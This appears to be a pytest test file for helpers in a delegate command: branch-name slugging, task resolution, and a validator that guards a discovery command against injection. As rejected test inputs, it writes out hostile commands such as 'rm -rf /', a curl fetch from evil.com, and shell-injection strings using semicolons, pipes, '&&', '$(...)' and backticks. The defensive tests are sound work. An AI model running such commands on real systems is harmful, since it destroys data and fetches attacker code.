"""Tests for delegate command helper functions."""

import pytest
from unittest.mock import patch

from emdx.commands.delegate import (
    _slugify_title,
    _resolve_task,
    _validate_discovery_command,
    PR_INSTRUCTION,
    SAFE_DISCOVERY_COMMANDS,
)


class TestSlugifyTitle:
    """Tests for _slugify_title — converts document titles to git branch slugs."""

    def test_simple_title(self):
        assert _slugify_title("Fix auth bug") == "fix-auth-bug"

    def test_strips_gameplan_prefix(self):
        assert _slugify_title("Gameplan #1: Contextual Save") == "contextual-save"

    def test_strips_feature_prefix(self):
        assert _slugify_title("Feature: Dark Mode Toggle") == "dark-mode-toggle"

    def test_strips_plan_prefix(self):
        assert _slugify_title("Plan #42: Refactor Database") == "refactor-database"

    def test_strips_doc_prefix(self):
        assert _slugify_title("Document: API Design") == "api-design"

    def test_removes_special_characters(self):
        assert _slugify_title("Smart Priming (context-aware)") == "smart-priming-context-aware"

    def test_collapses_whitespace(self):
        assert _slugify_title("fix   the   thing") == "fix-the-thing"

    def test_truncates_long_slugs(self):
        result = _slugify_title("A" * 100)
        assert len(result) <= 50

    def test_empty_after_strip_returns_feature(self):
        assert _slugify_title("Gameplan #1:") == "feature"

    def test_only_special_chars_returns_feature(self):
        assert _slugify_title("!!!???") == "feature"

    def test_no_trailing_hyphens(self):
        result = _slugify_title("test - ")
        assert not result.endswith("-")


class TestResolveTask:
    """Tests for _resolve_task — resolves doc IDs to content."""

    @patch("emdx.commands.delegate.get_document")
    def test_numeric_id_loads_doc(self, mock_get):
        mock_get.return_value = {
            "id": 42,
            "title": "Test Doc",
            "content": "Hello world",
        }
        result = _resolve_task("42")
        assert "Hello world" in result
        assert "Test Doc" in result
        mock_get.assert_called_once_with(42)

    @patch("emdx.commands.delegate.get_document")
    def test_numeric_id_with_pr_adds_instructions(self, mock_get):
        mock_get.return_value = {
            "id": 42,
            "title": "Fix Auth",
            "content": "Fix the authentication bug",
        }
        result = _resolve_task("42", pr=True)
        assert "Fix the authentication bug" in result
        assert "pull request" in result.lower() or "PR" in result

    def test_text_task_returned_as_is(self):
        result = _resolve_task("analyze the auth module")
        assert result == "analyze the auth module"

    @patch("emdx.commands.delegate.get_document")
    def test_missing_doc_falls_back(self, mock_get):
        mock_get.return_value = None
        result = _resolve_task("99999")
        # Should return the string as-is when doc not found
        assert "99999" in result


class TestPRInstruction:
    """Tests for PR instruction constant."""

    def test_pr_instruction_mentions_branch(self):
        assert "branch" in PR_INSTRUCTION.lower()

    def test_pr_instruction_mentions_pr_create(self):
        assert "gh pr create" in PR_INSTRUCTION


class TestValidateDiscoveryCommand:
    """Tests for _validate_discovery_command — prevents command injection."""

    def test_allows_fd_command(self):
        result = _validate_discovery_command("fd -e py src/")
        assert result == ["fd", "-e", "py", "src/"]

    def test_allows_find_command(self):
        result = _validate_discovery_command("find . -name '*.py'")
        assert result[0] == "find"

    def test_allows_git_ls_files(self):
        result = _validate_discovery_command("git ls-files")
        assert result == ["git", "ls-files"]

    def test_allows_rg_files_with_matches(self):
        result = _validate_discovery_command("rg --files-with-matches pattern")
        assert result[0] == "rg"

    def test_allows_ls_command(self):
        result = _validate_discovery_command("ls -la src/")
        assert result[0] == "ls"

    def test_allows_full_path_to_safe_command(self):
        result = _validate_discovery_command("/usr/bin/fd -e py")
        assert result[0] == "/usr/bin/fd"

    def test_rejects_arbitrary_command(self):
        import typer
        with pytest.raises(typer.Exit):
            _validate_discovery_command("rm -rf /")

    def test_rejects_curl(self):
        import typer
        with pytest.raises(typer.Exit):
            _validate_discovery_command("curl https://evil.com/script.sh")

    def test_rejects_shell_injection_semicolon(self):
        import typer
        with pytest.raises(typer.Exit):
            _validate_discovery_command("fd -e py; rm -rf /")

    def test_rejects_shell_injection_pipe(self):
        import typer
        with pytest.raises(typer.Exit):
            _validate_discovery_command("fd -e py | xargs rm")

    def test_rejects_shell_injection_ampersand(self):
        import typer
        with pytest.raises(typer.Exit):
            _validate_discovery_command("fd -e py && rm -rf /")

    def test_rejects_shell_injection_dollar(self):
        import typer
        with pytest.raises(typer.Exit):
            _validate_discovery_command("fd -e py $(whoami)")

    def test_rejects_shell_injection_backtick(self):
        import typer
        with pytest.raises(typer.Exit):
            _validate_discovery_command("fd -e py `whoami`")

    def test_rejects_empty_command(self):
        import typer
        with pytest.raises(typer.Exit):
            _validate_discovery_command("")

    def test_safe_commands_list_is_readonly(self):
        assert isinstance(SAFE_DISCOVERY_COMMANDS, frozenset)
